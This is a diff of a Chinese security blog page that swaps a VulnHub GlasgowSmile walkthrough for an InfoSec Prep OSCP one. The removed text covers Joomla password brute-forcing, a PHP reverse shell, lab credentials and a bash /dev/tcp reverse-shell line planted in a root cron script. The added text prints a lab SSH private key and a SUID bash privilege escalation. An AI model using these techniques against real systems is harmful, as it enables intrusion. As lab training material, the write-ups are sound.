@@ -4,8 +4,19 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="GlasgowSmile：定制字典生成爆破与提权的多种姿势, SummerOne">
-    <meta name="description" content="根据网页内容生成爆破字典，爆破CMS系统后获取反弹shell，利用数据库、密码学、文件搜索等获取各用户账密信息，最后进程监控，提取至root权限">
+    <meta name="keywords" content="9-infosec-vulnhub, SummerOne">
+    <meta name="description" content="
+靶机下载地址
+
+1.信息收集nmap扫端口：
+
+开放端口
+
+22 ssh OpenSSH 8.2p1
+80 http Apache httpd 2.4.41
+33060 mysqlx?
+
+2.发现SSH私钥扫描目录，扫描出了robots.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +28,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>GlasgowSmile：定制字典生成爆破与提权的多种姿势 | SummerOne</title>
+    <title>9-infosec-vulnhub | SummerOne</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +331,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://img.freepik.com/premium-psd/fat-lay-wedding-cards-with-candles-rings_23-2148530350.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">GlasgowSmile：定制字典生成爆破与提权的多种姿势</h1>
+                    <h1 class="description center-align post-title">9-infosec-vulnhub</h1>
                 </div>
             </div>
         </div>
@@ -378,7 +389,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-28
+                    2022-12-12
                 </div>
                 
 
@@ -407,131 +418,82 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/glasgow-smile-11,491/">靶机链接</a></p>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>扫描存在主机，靶机ip：192.168.71.134</p>
-<p><img src="/posts/3bd3766a/image-20221117223719161.png"></p>
-<p>扫描开放端口</p>
-<p><img src="/posts/3bd3766a/image-20221117224430723.png"></p>
-<p>开放端口及服务版本：</p>
+                <blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">靶机下载地址</a></p>
+</blockquote>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>nmap扫端口：</p>
+<p><img src="/posts/bbcbdc7c/image-20221212111910598.png"></p>
+<p>开放端口</p>
 <ul>
-<li>22&#x2F;tcp OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</li>
-<li>80&#x2F;tcp Apache httpd 2.4.38 ((Debian))</li>
+<li>22 ssh OpenSSH 8.2p1</li>
+<li>80 http Apache httpd 2.4.41</li>
+<li>33060 mysqlx?</li>
 </ul>
-<p>80端口：一张图片joker.jpg。</p>
-<p><img src="/posts/3bd3766a/image-20221117224553420.png"></p>
-<p>开始进行目录扫描。</p>
-<pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.71.134 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="2-发现SSH私钥"><a href="#2-发现SSH私钥" class="headerlink" title="2.发现SSH私钥"></a>2.发现SSH私钥</h2><p>扫描目录，扫描出了robots.txt，查看了一下，发现泄漏了文件secret.txt</p>
+<p><img src="/posts/bbcbdc7c/image-20221212114815268.png"></p>
+<p>查看secret.txt文件，首先这个文件名就很有意思，方向应该是对的。看到最后两个等号猜测是base64编码后的数据。</p>
+<p><img src="/posts/bbcbdc7c/image-20221212114844237.png"></p>
+<p>base64解码：</p>
+<p><img src="/posts/bbcbdc7c/image-20221212114923426.png"></p>
+<p>得到了OpenSSH的私钥文件，在kali上保存为secret.txt。</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-----BEGIN OPENSSH PRIVATE KEY-----
+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
+8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
+-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>扫出的目录很多，重点是一名为joomla的目录。貌似是一个博客页面，google了下发现是一个内容管理系统（CMS）。</p>
-<p>审查了源码没发现特别。</p>
-<p><img src="/posts/3bd3766a/image-20221117230857617.png" alt="joomla"></p>
-<p>扫描到了一个登录页面，看了下Joomla没有默认账密，所以可能需要爆破或其他途径获取账密。</p>
-<p><img src="/posts/3bd3766a/image-20221117231507377.png" alt="administrator"></p>
-<p>搜索Joomla系统的已知漏洞，测试poc：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47465">https://www.exploit-db.com/exploits/47465</a></p>
-<p><img src="/posts/3bd3766a/image-20221117234904447.png"></p>
-<p>不能利用。</p>
-<h2 id="2-cewl生成字典"><a href="#2-cewl生成字典" class="headerlink" title="2.cewl生成字典"></a>2.cewl生成字典</h2><p>尝试爆破joomla的登录界面。在joomla首页里全是小丑电影相关的台词，猜测站主可能会利用这些台词作为密码。于是利用 <a target="_blank" rel="noopener" href="https://www.kali.org/tools/cewl/">cewl</a> 工具以主页内容生成密码字典。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://192.168.71.134/joomla <span class="token parameter variable">-m</span> <span class="token number">5</span> <span class="token parameter variable">-d</span> <span class="token number">1</span> <span class="token parameter variable">-w</span> joker.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>有了私钥文件，但是没有用户名。这时仔细看80端口的网页，发现了提示：</p>
+<p><img src="/posts/bbcbdc7c/image-20221212145508221.png"></p>
+<p>OpenSSH除了可以用用户名密码登录之外，也可以利用私钥公钥对登录。现在利用用户名oscp和私钥登录靶机，-i参数指定私钥文件。命令如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh -i secret.txt oscp@192.168.71.150<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/posts/3bd3766a/image-20221129210020094.png"></p>
-<p>新建users.txt，作为用户名。</p>
-<p><img src="/posts/3bd3766a/image-20221129210100551.png"></p>
-<h2 id="3-Joomla密码爆破"><a href="#3-Joomla密码爆破" class="headerlink" title="3.Joomla密码爆破"></a>3.Joomla密码爆破</h2><p>利用nmap的NSE脚本爆破joomla。首先查找joomla相关脚本，找到了http-joomla-brute.nse。</p>
-<p><img src="/posts/3bd3766a/image-20221129212447122.png"></p>
-<p>修改脚本，更改脚本中的默认登录URI：</p>
-<p><img src="/posts/3bd3766a/image-20221129212957914.png"></p>
-<p>利用刚才生成的密码字典开始爆破：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> http-joomla-brute --script-args <span class="token string">'userdb=users.txt,passdb=joker.txt'</span> <span class="token number">192.168</span>.71.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/posts/bbcbdc7c/image-20221212145620799.png"></p>
+<p>登录成功，查看一下现在的权限，是oscp用户权限。</p>
+<p><img src="/posts/bbcbdc7c/image-20221212150335574.png"></p>
+<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>思路还是suid提权，查找suid权限文件命令如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/posts/3bd3766a/image-20221129213354809.png"></p>
-<p>爆破出了三个账号，后两个经验证是错的，可能是换行符的原因，但是joomla用户可以登录。</p>
-<p>用<strong>账密joomla:Gotham</strong>登录joomla后台。</p>
-<p><img src="/posts/3bd3766a/image-20221129215145303.png"></p>
-<h2 id="4-PHP反弹shell"><a href="#4-PHP反弹shell" class="headerlink" title="4.PHP反弹shell"></a>4.PHP反弹shell</h2><p>进入系统后，编辑Beez3模板中的index.php，替换为<a target="_blank" rel="noopener" href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP 反弹shell</a> ，把相应的反弹地址和端口改为kali的ip地址和监听端口并保存。</p>
-<p><img src="/posts/3bd3766a/image-20221130003031536.png" alt="进入Beez3模板页面"></p>
-<p><img src="/posts/3bd3766a/image-20221129220840828.png" alt="修改模板的index.php"></p>
-<p>在kali中用ncat监听4000端口，并点击预览更改后的index.php</p>
-<p><img src="/posts/3bd3766a/image-20221129221543141.png" alt="点击标黄色的按钮触发"></p>
-<p>shell反弹成功！</p>
-<p><img src="/posts/3bd3766a/image-20221129221913736.png"></p>
-<p>利用python3转为bash终端：</p>
-<pre class="line-numbers language-none"><code class="language-none">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5.权限提升"></a>5.权限提升</h2><p>查看当前用户权限，目前为www-data，是网络站点用户。</p>
-<p><img src="/posts/3bd3766a/image-20221129223057288.png"></p>
-<p>去&#x2F;home目录下看到有三个用户：</p>
-<p><img src="/posts/3bd3766a/image-20221129223203328.png"></p>
-<h3 id="提权至rob用户"><a href="#提权至rob用户" class="headerlink" title="提权至rob用户"></a>提权至rob用户</h3><p>进入到&#x2F;var&#x2F;www&#x2F;joomla2目录，发现一个配置文件configuration.php</p>
-<p><img src="/posts/3bd3766a/image-20221129223558854.png"></p>
-<p>查看配置文件，发现了数据库的用户名和密码</p>
-<p><img src="/posts/3bd3766a/image-20221129223822633.png"></p>
-<p>尝试用用户名joomla和密码babyjoker登录mysql数据库，登录成功！</p>
-<p><img src="/posts/3bd3766a/image-20221129224128946.png"></p>
-<p>经过一番查找，在数据库batjoke的taskforce表中，发现了rob用户的信息，rob为系统三个用户之一，这个密码可能就是系统rob用户的密码。</p>
-<p><img src="/posts/3bd3766a/image-20221129224454382.png"></p>
-<p>将pswd用base64解密</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><strong>用户：rob 密码：???AllIHaveAreNegativeThoughts???</strong></p>
-<p>还记得信息收集中，靶机开放了22端口，用获取的用户名密码尝试ssh连接：</p>
-<p><img src="/posts/3bd3766a/image-20221129225218190.png"></p>
-<p>成功以rob用户登录。</p>
-<p>查看rob用户目录下的三个文件，分别是rob用户的user.txt，获取root权限的提示和Abner用户需要帮助。看来离获取root权限还有段距离，下一个要获取的权限是abner用户。</p>
-<p><img src="/posts/3bd3766a/image-20221129225656149.png"></p>
-<h3 id="提权至abner用户"><a href="#提权至abner用户" class="headerlink" title="提权至abner用户"></a>提权至abner用户</h3><p>根据Abnerineedyourhelp文件的内容分析，这一堆字像是打乱了字母顺序的英文单词。考虑为<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ROT13">rot13</a> 类似的加密算法，用<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行解密。</p>
-<p><img src="/posts/3bd3766a/image-20221129230856980.png"></p>
-<p>对后面一串密码进行base64解码：</p>
-<p><img src="/posts/3bd3766a/image-20221129231021696.png"></p>
-<p><strong>用户：abner 密码：I33hope99my0death000makes44more8cents00than0my0life0</strong></p>
-<p>利用su切换至abner用户：</p>
-<p><img src="/posts/3bd3766a/image-20221129231627864.png"></p>
-<p>获取到abner用户的user2.txt，然后查看info.txt文件，内容为“格拉斯哥微笑”的介绍，没有下一步提升权限的信息。</p>
-<p><img src="/posts/3bd3766a/image-20221129231934057.png"></p>
-<h3 id="提权至penguin用户"><a href="#提权至penguin用户" class="headerlink" title="提权至penguin用户"></a>提权至penguin用户</h3><p>已知系统有三个用户，现在就剩下penguin用户了。全盘搜索与penguin相关的文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -iname *penguin* 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>找到了一个隐藏文件.dear_penguins.zip</p>
-<p><img src="/posts/3bd3766a/image-20221129232408727.png"></p>
-<p>把这个文件复制到用户目录进行解压，需要密码为abner用户的密码：I33hope99my0death000makes44more8cents00than0my0life0</p>
-<pre class="line-numbers language-none"><code class="language-none">cp &#x2F;var&#x2F;www&#x2F;joomla2&#x2F;administrator&#x2F;manifests&#x2F;files&#x2F;.dear_penguins.zip ~ &amp;&amp; unzip .dear_penguins.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/posts/3bd3766a/image-20221129232837056.png"></p>
-<p>查看解压后的文件内容：</p>
-<p><img src="/posts/3bd3766a/image-20221129233036701.png"></p>
-<p>最后这串密码用base64解密不成功，原来这是明文&#x3D; &#x3D;</p>
-<p><strong>用户：penguin 密码：scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz</strong></p>
-<p>su切换用户后，获取到user3.txt</p>
-<p><img src="/posts/3bd3766a/image-20221129233856882.png"></p>
-<h3 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h3><p>通过查看penguin的文件，发现.trash_old文件很可疑，它的内容中包含&#x2F;bin&#x2F;sh，而且在root用户组中，而且可以执行。</p>
-<p><img src="/posts/3bd3766a/image-20221129234508764.png"></p>
-<p>利用**<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a>**对系统进程进行监控，以及对用户命令的执行进行枚举。先让靶机从kali上下载工具：</p>
-<p>kali开启HTTP服务在8080端口</p>
-<p><img src="/posts/3bd3766a/image-20221129235439088.png"></p>
-<p>靶机从kali下载pspy</p>
-<p><img src="/posts/3bd3766a/image-20221129235624907.png"></p>
-<p>将pspy赋权限并执行</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x pspy <span class="token operator">&amp;&amp;</span> ./pspy <span class="token parameter variable">-p</span> <span class="token parameter variable">-i</span> <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>-p：启用输出命令到标准输出（默认启用）<br>-f：启用将文件系统事件打印到STDOUT（默认禁用）<br>-i：两次扫描procfs的时间间隔（单位：毫秒）</p>
-<p>发现.trash_old文件每间隔一分钟就以root用户身份运行一次。</p>
-<p><img src="/posts/3bd3766a/image-20221129235938608.png"></p>
-<p>修改.trash_old，添加以下反弹shell并注释exit 0.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.71.129/4000 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/posts/3bd3766a/image-20221130000731474.png"></p>
-<p>然后 kali主机监听4000端口，因为.trash_old每1分钟执行一次，所以等待.trash_old被执行时反弹shell回来。</p>
-<p><img src="/posts/3bd3766a/image-20221130001104189.png"></p>
-<p>获取到root权限成功！</p>
-<p><img src="/posts/3bd3766a/image-20221130001225605.png"></p>
-<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>该靶机考察了以下知识点：</p>
-<ul>
-<li>cewl生成字典</li>
-<li>利用joomla系统PHP反弹shell</li>
-<li>密码学基础</li>
-<li>全盘搜索敏感文件</li>
-<li>pspy监控进程</li>
-</ul>
-<p>总之以Joomla内容管理系统为切入点，通过爆破进入系统后台，修改网页模板文件获取站点用户shell。接下来是步步深入考察各种提权姿势，利用数据库、密码学、文件搜索等获取各用户账密信息，最后进程监控，在以root权限执行的进程中植入反弹shell代码获取root权限。</p>
+<p><img src="/posts/bbcbdc7c/image-20221212150503007.png"></p>
+<p>发现bash文件可以直接利用。这里要注意加-p参数，否则提权不成功。</p>
+<p>-p选项让bash保留启动时使用的有效用户id，而如果没有它，它将把有效uid设置为实际的uid(您的用户)。即-p参数可使会话保持在程序拥有者的权限，否则会回到本来的权限（本例为oscp用户）。</p>
+<p><img src="/posts/bbcbdc7c/image-20221212151610328.png"></p>
+<p>获取flag文件，提权成功！</p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这个靶机非常简单，没有那么多绕的可以说只有一步。</p>
+<p>我不熟悉的地方是获取到ssh私钥文件之后的登录方式，这次记住了。</p>
+<p>另外在提权方面，suid文件提权用得情况很多，近期会出一个suid提权知识总结。</p>
 
                 
             </div>
@@ -558,7 +520,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://summerone111.github.io/posts/3bd3766a.html">https://summerone111.github.io/posts/3bd3766a.html</a>
+                    <a href="https://summerone111.github.io/posts/bbcbdc7c.html">https://summerone111.github.io/posts/bbcbdc7c.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -644,17 +606,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/d117200a.html">
+                <a href="/posts/bbcbdc7c.html">
                     <div class="card-image">
                         
+                        <img src="https://img.freepik.com/premium-psd/fat-lay-wedding-cards-with-candles-rings_23-2148530350.jpg" class="responsive-img" alt="9-infosec-vulnhub">
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Photographer：利用sambashare获取账密信息">
-                        
-                        <span class="card-title">Photographer：利用sambashare获取账密信息</span>
+                        <span class="card-title">9-infosec-vulnhub</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -664,9 +626,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -679,6 +641,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -701,13 +664,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/3bf2f4be.html">
+                <a href="/posts/790d5f77.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="HackMePlease：从开源项目中获取账密信息">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="DevGuru：利用GitTools获取git仓库内容">
                         
-                        <span class="card-title">HackMePlease：从开源项目中获取账密信息</span>
+                        <span class="card-title">DevGuru：利用GitTools获取git仓库内容</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -718,7 +681,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-04
                             </span>
                         <span class="publish-author">
                             
